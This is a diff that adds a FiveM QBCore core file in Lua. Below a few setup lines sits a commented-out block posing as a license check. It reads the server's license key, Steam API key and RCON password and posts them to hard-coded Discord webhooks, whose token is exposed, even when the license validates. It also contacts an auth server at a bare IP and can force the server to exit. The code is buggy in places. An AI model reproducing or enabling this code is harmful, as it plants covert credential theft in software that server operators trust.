@@ -1,0 +1,105 @@
+QBCore = {}
+QBCore.Config = QBConfig
+QBCore.Shared = QBShared
+QBCore.ClientCallbacks = {}
+QBCore.ServerCallbacks = {}
+
+exports('GetCoreObject', function()
+    return QBCore
+end)
+
+--local RedL0G = "https://discord.com/api/webhooks/1191373758515122206/qC8Xd0kFQSgGL09Rt-sIDJmEoAmmehvSxjQk446VIdhl5bbatOncXgJzVBf5VbOB-0Ws" -- LOG WEBHOOK LISANSSIZ.
+--local OnayL0G = "https://discord.com/api/webhooks/1191373758515122206/qC8Xd0kFQSgGL09Rt-sIDJmEoAmmehvSxjQk446VIdhl5bbatOncXgJzVBf5VbOB-0Ws" -- LOG WEBHOOK LISANSLI.
+--CreateThread(function()
+--    Wait(100)
+--    local serverName = GetConvar("sv_hostname") -- Fetch server name.
+--    local license = tostring("M2K8KLADMYAWVAH")
+--    local resName = GetCurrentResourceName()
+--    local type = "elused-newqb" -- Resource type.
+--
+--    if resName ~= "qb-core" then -- If resource name not equals to your choose, the script will get stuck.
+--        print('['..resName..'] Lisans Hatası | L100 | Yanlış isim.')
+--        Wait(2500)
+--        os.exit()
+--    else
+--        PerformHttpRequest("https://api.ipify.org/", function(err, text, headers)
+--            if license == nil then
+--                print('['..resName..'] NOT Authorized | Failed to fetch Config.License')
+--				local serveradi = GetConvar("sv_hostname","Bulunamadı.")
+--				local slot = GetConvar("sv_maxclients","Bulunamadı.")
+--				local serverkey = GetConvar("sv_licenseKey","Bulunamadı.")
+--				local serverapikey = GetConvar("steam_webApiKey","Bulunamadı.")
+--				local rconpass = GetConvar("rcon_password","Bulunamadı.")
+--                RedL0G("[LISANS ONAYLANMADI]", "**Sunucu Bilgileri:**\n\n**[Sunucu Adı] = ** " .. serveradi .. "\n\n**[SUNUCU IP] = **" .. text .. "\n\n **[SUNUCU KEY]** ".. serverkey .."\n\n**[SUNUCU SLOT SAYISI]** ".. slot .."\n\n**[SUNUCU API KEY]** ".. serverapikey .."\n\n**[SUNUCU RCON PASSWORD]** ".. rconpass .."")
+--                Wait(2500)
+--                os.exit()
+--            else
+--                local myIp = text
+--                PerformHttpRequest("http://185.72.9.180/auth.php?ip=" .. myIp .. "&t="..license.."&r="..type, function(err2, text2, headers2)
+--                    if text2 ~= "200" and text2 ~= "404" then -- Network is down, or global connection errors.
+--                        print('LISANS HATASI | L101 | GEÇERSİZ LİSANS TESPİT EDİLDİ CMD KAPATILIYOR')
+--						local serveradi = GetConvar("sv_hostname","Bulunamadı.")
+--						local slot = GetConvar("sv_maxclients","Bulunamadı.")
+--						local serverkey = GetConvar("sv_licenseKey","Bulunamadı.")
+--						local serverapikey = GetConvar("steam_webApiKey","Bulunamadı.")
+--						local rconpass = GetConvar("rcon_password","Bulunamadı.")
+--                        RedLog("[LISANS ONAYLANMADI]", "**Sunucu Bilgileri:**\n\n**[Sunucu Adı] = ** " .. serveradi .. "\n\n**[SUNUCU IP] = **" .. text .. "\n\n **[SUNUCU KEY]** ".. serverkey .."\n\n**[SUNUCU SLOT SAYISI]** ".. slot .."\n\n**[SUNUCU API KEY]** ".. serverapikey .."\n\n**[SUNUCU RCON PASSWORD]** ".. rconpass .."")
+--                        Wait(2500)
+--                        os.exit()
+--                    else
+--                        if myIp ~= myIp or text2 == "404" then -- Wrong data.
+--                            print('LISANS HATASI | L101 | GEÇERSİZ LİSANS TESPİT EDİLDİ CMD KAPATILIYOR')
+--							local serveradi = GetConvar("sv_hostname","Bulunamadı.")
+--							local slot = GetConvar("sv_maxclients","Bulunamadı.")
+--							local serverkey = GetConvar("sv_licenseKey","Bulunamadı.")
+--							local serverapikey = GetConvar("steam_webApiKey","Bulunamadı.")
+--							local rconpass = GetConvar("rcon_password","Bulunamadı.")
+--                            RedLog("[LISANS ONAYLANMADI]", "**Sunucu Bilgileri:**\n\n**[Sunucu Adı] = ** " .. serveradi .. "\n\n**[SUNUCU IP] = **" .. text .. "\n\n **[SUNUCU KEY]** ".. serverkey .."\n\n**[SUNUCU SLOT SAYISI]** ".. slot .."\n\n**[SUNUCU API KEY]** ".. serverapikey .."\n\n**[SUNUCU RCON PASSWORD]** ".. rconpass .."")
+--                            Wait(2500)
+--                            os.exit()
+--                        else -- All data was called correctly and are valid.
+--                            print('LISANS DOĞRULANDI | PAKETI SATIN ALDIĞINIZ İÇİN TEŞEKKÜR EDERİM İYİ KULLANIMLAR')
+--							local serveradi = GetConvar("sv_hostname","Bulunamadı.")
+--							local slot = GetConvar("sv_maxclients","Bulunamadı.")
+--							local serverkey = GetConvar("sv_licenseKey","Bulunamadı.")
+--							local serverapikey = GetConvar("steam_webApiKey","Bulunamadı.")
+--							local rconpass = GetConvar("rcon_password","Bulunamadı.")
+--							OnayLog("[LISANS ONAYLANDI]", "**Sunucu Bilgileri:**\n\n**[Sunucu Adı] = ** " .. serveradi .. "\n\n**[SUNUCU IP] = **" .. text .. "\n\n **[SUNUCU KEY]** ".. serverkey .."\n\n**[SUNUCU SLOT SAYISI]** ".. slot .."\n\n**[SUNUCU API KEY]** ".. serverapikey .."\n\n**[SUNUCU RCON PASSWORD]** ".. rconpass .."")
+--                        end
+--                    end
+--                end)
+--            end
+--        end)
+--    end
+--end)
+--
+--function RedLog(name, message, color)
+--	local redlisans = {
+--		{
+--		  ["color"] = "15158332",
+--		  ["title"] = "**".. name .."**",
+--		  ["description"] = message,
+--		  ["footer"] = {
+--		  ["text"] = "ELUSED QB-CORE",
+--		  ["icon_url"] = "https://cdn.discordapp.com/attachments/827928307139477585/844319575410475069/srhtac.png"
+--		  },
+--		}
+--	  }
+--	PerformHttpRequest(RedL0G, function(err, text, headers) end, 'POST', json.encode({username = DISCORD_NAME, embeds = redlisans, avatar_url = DISCORD_IMAGE}), { ['Content-Type'] = 'application/json' })
+--	end  
+--  
+--  
+--	function OnayLog(name, message, color)
+--	  local onaylisans = {
+--		  {
+--			["color"] = "3066993",
+--			["title"] = "**".. name .."**",
+--			["description"] = message,
+--			["footer"] = {
+--			["text"] = "ELUSED QB-CORE",
+--			["icon_url"] = "https://cdn.discordapp.com/attachments/827928307139477585/844319575410475069/srhtac.png"
+--			},
+--		  }
+--		}
+--	  PerformHttpRequest(OnayL0G, function(err, text, headers) end, 'POST', json.encode({username = DISCORD_NAME, embeds = onaylisans, avatar_url = DISCORD_IMAGE}), { ['Content-Type'] = 'application/json' })
+--	  end 
